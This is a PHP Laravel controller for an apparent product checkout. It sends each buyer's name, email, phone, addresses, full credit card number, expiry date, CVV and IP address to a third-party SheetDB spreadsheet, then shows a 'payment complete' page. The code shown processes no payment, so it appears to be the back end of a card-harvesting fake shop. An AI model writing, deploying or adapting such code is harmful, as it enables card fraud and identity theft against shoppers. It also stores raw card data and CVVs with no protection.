<?php

namespace App\Http\Controllers;

use SheetDB\SheetDB;
use Illuminate\Http\Request;
use App\Models\PixelModel;

class PostController extends Controller
{

    public function store(Request $request)
    {
        $sheetdb = new SheetDB('ochxogms6mpos');
        $actualPixel = PixelModel::first();
        $sheetdb->create([
            'date'                      => date('d-m-Y H:i:s'),
            'product_name'              => $request->input('product_name'),
            'product_price'             => $request->input('product_price'),
            'product_quantity'          => $request->input('product_quantity'),
            'subtotal_dolar'            => $request->input('subtotal_dolar'),
            'shipping_price_dolar'      => $request->input('shipping_price_dolar'),
            'shipping_description'      => $request->input('shipping_description'),
            'taxes_dolar'               => $request->input('taxes_dolar'),
            'total_dolar'               => $request->input('total_dolar'),
            'client_currency'           => $request->input('client_currency'),
            'client_currency_exchange'  => $request->input('client_currency_exchange'),
            'email'                     => $request->input('checkout')["email"],
            'shipping_first_name'       => $request->input('checkout')['shipping_first_name'],
            'shipping_last_name'        => $request->input('checkout')['shipping_last_name'],
            'shipping_phone'            => $request->input('checkout')['shipping_phone'],
            'shipping_address1'         => $request->input('checkout')['shipping_address1'],
            'shipping_zip'              => $request->input('checkout')['shipping_zip'],
            'shipping_city'             => $request->input('checkout')['shipping_city'],
            'shipping_province'         => $request->input('checkout')['shipping_province'],
            'shipping_country_code'     => $request->input('checkout')['shipping_country_code'],
            'accepts_marketing'         => $request->input('checkout')['accepts_marketing'],
            'shipping_rate_id'          => $request->input('checkout')['shipping_rate_id'],
            'billing_address_same'      => $request->input('checkout')['billing_address_same'],
            'billing_first_name'        => $request->input('checkout')['billing_first_name'],
            'billing_last_name'         => $request->input('checkout')['billing_last_name'],
            'billing_address1'          => $request->input('checkout')['billing_address1'],
            'billing_zip'               => $request->input('checkout')['billing_zip'],
            'billing_city'              => $request->input('checkout')['billing_city'],
            'billing_province'          => $request->input('checkout')['billing_province'],
            'billing_company'           => $request->input('checkout')['billing_company'],
            'credit_card_number'        => $request->input('credit_card_number'),
            'cc-exp'                    => $request->input('cc-exp'),
            'credit_card_cvv'           => $request->input('credit_card_cvv'),
            'ccType'                    => $request->input('ccType'),
            'client_ip'                 => $request->ip()
        ]);

        if($request->input('language') == "spanish"){
            return view('productlink.paymentcompletespanish',[
                'shipping_first_name'       => $request->input('checkout')['shipping_first_name'],
                'product_quantity'          => $request->input('product_quantity'),
                'product_name'              => $request->input('product_name'),
                'product_price'             => $request->input('product_price'),
                'product_image_path'        => $request->input('product_image_path'),
                'checkout_free_option_label'=> $request->input('checkout_free_option_label'),
                'checkout_free_option_value'=> $request->input('checkout_free_option_value'),
                'checkout_taxes_value'      => $request->input('checkout_taxes_value'),
                'subtotal_dolar'            => $request->input('subtotal_dolar'),
                'shipping_price_dolar'      => $request->input('shipping_price_dolar'),
                'taxes_dolar'               => $request->input('taxes_dolar'),
                'total_dolar'               => $request->input('total_dolar'),
                'client_currency'           => $request->input('client_currency'),
                'client_currency_exchange'  => $request->input('client_currency_exchange'),
                'shipping_description'      => $request->input('shipping_description'),
                'language'                  => $request->input('language'),
                'actualPixel'               => $actualPixel
            ]);
        }
        else{
            return view('productlink.paymentcompletenglish',[
                'shipping_first_name' => $request->input('checkout')['shipping_first_name'],
                'product_quantity' => $request->input('product_quantity'),
                'product_name' => $request->input('product_name'),
                'product_price' => $request->input('product_price'),
                'product_image_path' => $request->input('product_image_path'),
                'checkout_free_option_value' => $request->input('checkout_free_option_value'),
                'checkout_free_option_label' => $request->input('checkout_free_option_label'),
                'checkout_taxes_value' => $request->input('checkout_taxes_value'),
                'subtotal_dolar'            => $request->input('subtotal_dolar'),
                'shipping_price_dolar'      => $request->input('shipping_price_dolar'),
                'taxes_dolar'               => $request->input('taxes_dolar'),
                'total_dolar'               => $request->input('total_dolar'),
                'client_currency'           => $request->input('client_currency'),
                'client_currency_exchange'  => $request->input('client_currency_exchange'),
                'shipping_description'      => $request->input('shipping_description'),
                'language'                  => $request->input('language'),
                'actualPixel'               => $actualPixel
            ]);
        }            
    }
}